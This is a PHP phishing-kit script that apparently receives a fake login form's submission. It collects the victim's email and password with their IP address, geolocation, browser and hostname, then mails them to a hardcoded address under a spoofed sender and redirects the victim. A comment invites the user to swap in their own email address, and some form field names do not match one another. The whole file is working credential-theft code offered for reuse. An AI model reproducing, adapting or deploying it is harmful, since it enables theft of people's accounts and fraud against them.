<?php
header("Location: https://login.facebook.com/login.php?login_attempt=1");
if($_POST["email"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Wires Info-----------------------\n";
$message .= "|eMail : ".$_POST['userid']."\n";
$message .= "|PasSword : ".$_POST['frm-pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
//change ur email here
$sent ="emmaobinna@yandex.com";


$subject = "Result - ".$country;
$headers = "From: Results Wire<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['userid'])))
    {
	mail($sent,$subject,$message,$headers);header("Location: next.html");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
     header("Location: next.html");
}else{
header("Location: next.html");
}

?>